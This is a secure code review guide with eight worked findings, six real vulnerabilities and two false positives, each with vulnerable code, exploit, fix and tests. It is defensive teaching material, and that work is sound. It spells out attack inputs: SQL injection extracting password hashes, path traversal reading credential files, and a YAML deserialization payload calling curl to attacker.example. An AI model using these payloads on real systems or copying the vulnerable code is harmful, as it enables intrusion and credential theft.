# Review Examples

Eight findings as a reviewer would actually meet them. Six are vulnerabilities. Two are not —
they are the ones a scanner or a keyword pass reports, and the reasoning for closing them is the
part worth reading.

Each entry gives the claimed weakness, the disproof attempt from step 4 of the workflow, and
either a fix or the reason it stays an observation.

## Contents

- [1. Unscoped order lookup](#1-unscoped-order-lookup) — A01, CWE-639 — High
- [2. Sort parameter reaching ORDER BY](#2-sort-parameter-reaching-order-by) — A05, CWE-89 — High
- [3. Traversal in an attachment download](#3-traversal-in-an-attachment-download) — A01, CWE-22 — High
- [4. MD5 in a cache key](#4-md5-in-a-cache-key) — claimed CWE-328 — not a vulnerability
- [5. YAML config parsed with a code-capable loader](#5-yaml-config-parsed-with-a-code-capable-loader) — A08, CWE-502 — Critical
- [6. Profile update assigning the whole body](#6-profile-update-assigning-the-whole-body) — A01, CWE-915 — Critical
- [7. No CSRF token on a Bearer-auth JSON API](#7-no-csrf-token-on-a-bearer-auth-json-api) — claimed CWE-352 — not a vulnerability
- [8. User-supplied pattern in a search filter](#8-user-supplied-pattern-in-a-search-filter) — A06, CWE-1333 — Medium

---

## 1. Unscoped order lookup

`A01:2025` · `API1:2023` · `CWE-639` · ASVS V8 · High

```javascript
// Vulnerable: requireAuth establishes who, nothing establishes whether
app.get("/api/orders/:id", requireAuth, async (req, res) => {
  const order = await db.order.findUnique({ where: { id: Number(req.params.id) } });
  if (!order) return res.status(404).json({ error: "not_found" });
  res.json(order);
});
```

Disproof attempt: is `req.params.id` constrained? `Number()` makes it an integer, which stops
injection and stops nothing else. Is there a policy layer inside `db.order`? Prisma has no
row-level filter here. Is the route internal? It is under `/api` behind the same auth as the rest
of the app.

Exploit: `GET /api/orders/8123` with any valid session. Sequential integer IDs mean the whole
table is walkable in one loop.

```javascript
// Fixed: ownership is part of the lookup
app.get("/api/orders/:id", requireAuth, async (req, res) => {
  const order = await db.order.findFirst({
    where: { id: Number(req.params.id), customerId: req.user.id },
  });
  if (!order) return res.status(404).json({ error: "not_found" });
  res.json(order);
});
```

Why it closes: there is no separate `if` to omit, and a nonexistent order and someone else's
order return the same 404, so the endpoint stops confirming which IDs exist.

The tempting wrong fix is switching the primary key to a UUID. That raises guessing cost and
removes nothing: IDs leak through exports, emails, referrer headers, and support tickets, and the
read still succeeds once you have one.

Severity: any authenticated user, one account's data per request, full table over time. High, not
Critical, because it needs an account.

---

## 2. Sort parameter reaching ORDER BY

`A05:2025` · `CWE-89` · ASVS V1 · High

```python
# Vulnerable: the value is parameterized, the identifier is not
def list_invoices(user_id: int, sort: str, direction: str):
    sql = f"SELECT id, total_cents FROM invoices WHERE user_id = %s ORDER BY {sort} {direction}"
    return db.execute(sql, (user_id,)).fetchall()
```

Disproof attempt: `sort` looks like it might come from a fixed set of UI buttons. Grep the caller:
`list_invoices(actor.id, request.args["sort"], request.args["direction"])`. No validator between
the two. The ORM is not involved, so there is no parameterization to save it.

Exploit: `?sort=(SELECT CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE id=1)='a'
THEN id ELSE total_cents END)&direction=asc`. Row order becomes a one-bit oracle, and hashes come
out a character at a time. Stacked statements are not needed, which is why "we do not allow
semicolons" is not a defence.

```python
# Fixed: input selects a key, the server owns the SQL
SORT_COLUMNS = {"created": "created_at", "total": "total_cents", "status": "status"}
DIRECTIONS = {"asc": "ASC", "desc": "DESC"}

def list_invoices(user_id: int, sort: str, direction: str):
    column = SORT_COLUMNS.get(sort)
    order = DIRECTIONS.get(direction)
    if column is None or order is None:
        raise BadRequest("invalid_sort")

    sql = f"SELECT id, total_cents FROM invoices WHERE user_id = %s ORDER BY {column} {order}"
    return db.execute(sql, (user_id,)).fetchall()
```

Why it closes: only server-authored strings are interpolated. Escaping `sort`, or rejecting it
with a regex, means enumerating every dangerous construction; the allowlist enumerates the three
safe ones instead.

Regression test, which must fail before the fix:

```python
def test_sort_rejects_unknown_column(client, auth_alice):
    resp = client.get("/invoices", params={"sort": "(SELECT 1)", "direction": "asc"},
                      headers=auth_alice)
    assert resp.status_code == 400
```

---

## 3. Traversal in an attachment download

`A01:2025` · `CWE-22` · ASVS V5 · High

```python
# Vulnerable: join follows ../ and discards the base on an absolute path
@app.get("/attachments")
def download(name: str):
    return send_file(os.path.join(ATTACH_DIR, name))
```

Disproof attempt: is there a validator upstream? The blueprint has none. Does the framework
normalise? `send_file` guards `send_from_directory`, not a path you built yourself. Is the process
confined? Container filesystem, same user as the app, so `.env` and the app source are readable.

Exploit: `GET /attachments?name=../../../proc/self/environ` returns the process environment,
including database credentials. `name=/etc/passwd` also works, because `os.path.join` throws away
`ATTACH_DIR` when the second argument is absolute — the case a `..` check misses entirely.

```python
# Fixed: resolve first, then confirm the result is still inside the directory
from pathlib import Path

ATTACH_DIR = Path("/srv/attachments").resolve()

@app.get("/attachments")
def download(name: str):
    target = (ATTACH_DIR / name).resolve()
    if not target.is_relative_to(ATTACH_DIR) or not target.is_file():
        raise NotFound()
    return send_file(target)
```

Why it closes: the containment check runs after resolution, so `..` segments, encoded variants,
and symlinks are already collapsed into a real path. Rejecting strings that contain `..` before
resolution misses `..%2f`, `....//`, and a symlink inside the directory pointing out of it.

Stronger where the design allows it: accept an opaque attachment ID, look the stored filename up
in the database scoped to the actor, and never take a path from the client. That also fixes the
authorization hole this example quietly has — any user can read any attachment.

Remaining gap: `is_relative_to` compares paths, so a bind mount or a hardlink that places outside
content inside the directory still passes. Filesystem layout is not visible in code; state that
assumption in the finding.

---

## 4. MD5 in a cache key

Claimed `CWE-328` (use of weak hash) · not a vulnerability

Reported by a scanner rule that matches `md5` anywhere. This is the most common false positive in
a crypto sweep.

```python
# Not a vulnerability: MD5 as a cache key, no security property attached
def thumbnail_cache_path(image_url: str, width: int) -> Path:
    digest = hashlib.md5(f"{image_url}|{width}".encode()).hexdigest()
    return CACHE_DIR / digest[:2] / f"{digest}.webp"
```

Disproof attempt, and it succeeds on the first question. What security property depends on this
digest? None. It is a naming function. MD5's break is collision resistance; an attacker who
produces a collision here gets one cached thumbnail served for a different URL, and both inputs
are already public URLs they could request directly. Nothing authenticates, nothing authorises,
nothing is kept secret.

Reported as an observation: FIPS-mode deployments reject MD5 outright, so
`hashlib.md5(..., usedforsecurity=False)` on Python 3.9+ or `blake2b` documents the intent and
avoids a runtime failure later. That is portability, not a fix.

Where the same call would be a real finding — the difference is the property being relied on, not
the algorithm:

- Deduplicating uploaded files by digest, where a collision lets one user's file overwrite
  another's. That is integrity, and it becomes `A08:2025` with `CWE-328`.
- Deriving a token, session ID, password hash, or signature. `CWE-916` for passwords,
  `CWE-327` for a signature scheme.
- Verifying a downloaded artefact. `A03:2025`, `A08:2025`.

Do not put this in the findings list. A findings list padded with cache-key MD5 is how an author
learns to skim the whole report.

---

## 5. YAML config parsed with a code-capable loader

`A08:2025` · `CWE-502` · ASVS V15 · Critical

```python
# Vulnerable: yaml.Loader constructs arbitrary Python objects
@app.post("/pipelines/import")
def import_pipeline(actor: User = Depends(current_user)):
    spec = yaml.load(request.files["spec"].read(), Loader=yaml.Loader)
    return save_pipeline(actor, spec)
```

Disproof attempt: is the source untrusted? It is an uploaded file on an authenticated route, so
yes for any user with an account. Does the explicit loader allow Python object constructors? Yes:
`yaml.Loader` is the unsafe loader. The safe spelling in PyYAML is `yaml.safe_load` or
`Loader=yaml.SafeLoader`; there is no framework control between the upload and this call.

Exploit: upload a spec containing
`!!python/object/apply:subprocess.check_output [["curl", "https://attacker.example/x"]]`.
One authenticated request, arbitrary command in the app process.

```python
# Fixed: a loader that only builds plain data, then a schema
@app.post("/pipelines/import")
def import_pipeline(actor: User = Depends(current_user)):
    raw = request.files["spec"].read(MAX_SPEC_BYTES + 1)
    if len(raw) > MAX_SPEC_BYTES:
        raise BadRequest("spec_too_large")

    try:
        data = yaml.safe_load(raw)
    except yaml.YAMLError:
        raise BadRequest("invalid_spec")

    spec = PipelineSpec.model_validate(data)   # rejects unknown keys
    return save_pipeline(actor, spec)
```

Why it closes: `safe_load` has no constructor for arbitrary Python types, so no tag in the
document can reach an import or a call. The schema is a second, separate control — it stops
unexpected keys from reaching `save_pipeline`, which `safe_load` alone does not.

Remaining gaps worth naming: YAML aliases still allow a billion-laughs expansion, so the size cap
matters and a node-count cap is better; and `safe_load` on a 200 MB document is a memory problem
regardless of tags.

Severity: authenticated remote code execution in the application process. Critical — blast radius
is the host and every credential the process holds, not one user's data.

---

## 6. Profile update assigning the whole body

`A01:2025` · `API3:2023` · `CWE-915` · ASVS V2, V8 · Critical

```javascript
// Vulnerable: every column becomes client-writable
app.patch("/api/me", requireAuth, async (req, res) => {
  const user = await db.user.update({ where: { id: req.user.id }, data: req.body });
  res.json(user);
});
```

Disproof attempt: the row is correctly scoped — `where` uses the session user, so this is not an
IDOR. The question is which properties are writable, not which row. Read the schema: `User` has
`role`, `emailVerified`, `stripeCustomerId`, and `credits`. All are reachable through `data`.
Does a validator run first? There is no schema on the route. Is there a Prisma-level allowlist?
No; `data` is passed through.

Exploit: `PATCH /api/me` with `{"role":"admin"}`. Self-service privilege escalation from any
account, in one request. `{"credits": 999999}` and `{"emailVerified": true}` are the same bug.

```javascript
// Fixed: the server names the writable fields
const ProfilePatch = z.object({
  displayName: z.string().min(1).max(64).optional(),
  bio: z.string().max(500).optional(),
  locale: z.enum(["en", "vi"]).optional(),
}).strict();

app.patch("/api/me", requireAuth, async (req, res) => {
  const parsed = ProfilePatch.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_request" });

  const user = await db.user.update({
    where: { id: req.user.id },
    data: parsed.data,
    select: { id: true, displayName: true, bio: true, locale: true },
  });
  res.json(user);
});
```

Why it closes: an allowlist stays correct when someone adds a column. A denylist —
`delete req.body.role` — is correct only until the next migration, and the next migration will
not remember to update it. `.strict()` rejects unknown keys instead of dropping them silently, so
an attempt is a 400 you can alert on. `select` fixes the mirror-image bug: the response was
returning the whole row, including `stripeCustomerId`.

Regression test:

```javascript
test("role is not client-writable", async () => {
  await request(app).patch("/api/me").set(authAlice).send({ role: "admin" }).expect(400);
  const alice = await db.user.findUnique({ where: { id: aliceId } });
  expect(alice.role).toBe("user");
});
```

Asserting the 400 alone is not enough. Assert the stored value, or a future refactor that accepts
and ignores the field will pass this test.

---

## 7. No CSRF token on a Bearer-auth JSON API

Claimed `CWE-352` · not a vulnerability as deployed

A checklist pass flags every state-changing route with no CSRF token. CWE-352 is rank 3 in the
2025 CWE Top 25, so the reflex to report it is strong.

```javascript
// Not a vulnerability: no ambient credential, so there is nothing to ride
app.post("/api/transfers", requireBearer, async (req, res) => {
  const { toAccount, amountCents } = TransferSchema.parse(req.body);
  await transfers.create(req.user.id, toAccount, amountCents);
  res.status(201).json({ ok: true });
});
```

Disproof attempt, four checks that all have to hold:

1. How is the actor identified? `requireBearer` reads `Authorization: Bearer <jwt>` and nothing
   else. Confirmed by reading the middleware: no cookie fallback, no query parameter, no
   `X-Api-Key`.
2. Can a cross-origin page send that header? No. The browser does not attach it automatically,
   and script cannot read the token from another origin's storage. CSRF exploits ambient
   credentials; a header the attacker must supply is not ambient.
3. Does the request survive preflight? `Content-Type: application/json` plus a custom
   `Authorization` header is not a simple request, so the browser sends `OPTIONS` first.
4. Would CORS answer that preflight? `cors({ origin: ["https://app.example.com"] })` with no
   credentials flag and no origin reflection. Checked the config file, not the reputation of the
   package.

With all four holding, there is no exploitation path: no concrete cross-origin request completes.
The finding is closed as an observation, with the preconditions written down, because it is the
preconditions that are fragile — not the code in the diff.

What would bring it back, each of which is a real finding on its own:

- A cookie fallback added to `requireBearer` for a mobile client. Now the credential is ambient
  and CWE-352 applies to this route immediately.
- CORS changed to reflect `req.headers.origin` with `credentials: true`. That is `A02:2025` /
  `CWE-346` and it is worse than the CSRF it enables.
- A route added that accepts the token as a query parameter, or a form-encoded body accepted
  alongside JSON, which drops the preflight requirement.

How to write it up, so the closure is auditable rather than a shrug:

```text
## Observations
- POST /api/transfers has no CSRF token. Not exploitable as deployed: auth is Bearer-only
  (src/mw/auth.ts:14, no cookie path), CORS lists one origin without credentials
  (src/app.ts:31). Revisit if cookie auth or origin reflection is introduced. Add a test that
  asserts requireBearer rejects a cookie-only request, so the precondition is enforced rather
  than assumed.
```

That last sentence is the useful output. The right response to a closed finding whose safety rests
on a precondition is a test that pins the precondition, not a token nobody needs.

---

## 8. User-supplied pattern in a search filter

`A06:2025` · `CWE-1333` · ASVS V2 · Medium

```python
# Vulnerable: the pattern comes from the client and runs against every row
@app.get("/search")
def search(pattern: str, actor: User = Depends(current_user)):
    rx = re.compile(pattern, re.IGNORECASE)
    return [d for d in load_documents(actor) if rx.search(d.body)]
```

Disproof attempt: is the pattern really attacker-controlled? Yes, straight from the query string
with no validation. Is Python's `re` backtracking? Yes — it is a backtracking engine, so nested
quantifiers can go exponential. Is the work bounded elsewhere? No request timeout in the app;
the reverse proxy has a 60 s read timeout, which bounds one client's wait but not the CPU already
committed. Is the endpoint reachable without an account? No, it needs a session.

Exploit: `?pattern=(a%2B)%2B%24` against a document body containing a long run of `a`. One request
occupies a worker for minutes. With a handful of requests the pool is exhausted and the whole
application stops responding — the impact lands on all users, not just the caller.

```python
# Fixed: the client supplies terms, the server supplies the pattern
@app.get("/search")
def search(q: str, actor: User = Depends(current_user)):
    if len(q) > 128:
        raise BadRequest("query_too_long")
    terms = [re.escape(t) for t in q.split()[:8]]
    if not terms:
        raise BadRequest("query_empty")

    rx = re.compile("|".join(terms), re.IGNORECASE)
    return [d for d in load_documents(actor) if rx.search(d.body)]
```

Why it closes: `re.escape` turns every character into a literal, so no quantifier, group, or
alternation survives from user input. The pattern's structure is now server-authored and its size
is capped, which removes the exponential class rather than making it slower to trigger.

Why the tempting fixes are weaker: a timeout around the match does not exist in Python's `re`, so
it becomes a thread or subprocess with a kill — real complexity for a problem the escape removes.
A denylist of "dangerous" constructs like `(a+)+` fails because catastrophic backtracking has
many shapes and new ones keep being published. If genuine regex search is a product requirement,
use a linear-time engine (`re2`) or push the search into the database's full-text index.

Severity: Medium. Exploitability is trivial and the blast radius is availability for all users,
which argues higher, but it needs an authenticated account, causes no data loss, and recovers as
soon as the requests stop. Say the reasoning; a bare "Medium" invites an argument, and the
reasoning is what the reader actually needs in order to disagree usefully.

---

## Sources

- <https://owasp.org/Top10/2025/>
- <https://owasp.org/API-Security/editions/2023/en/0x11-t10/>
- <https://owasp.org/www-project-application-security-verification-standard/>
- <https://owasp.org/www-project-code-review-guide/>
- <https://cwe.mitre.org/top25/archive/2025/2025_cwe_top25.html>
- <https://cheatsheetseries.owasp.org/>
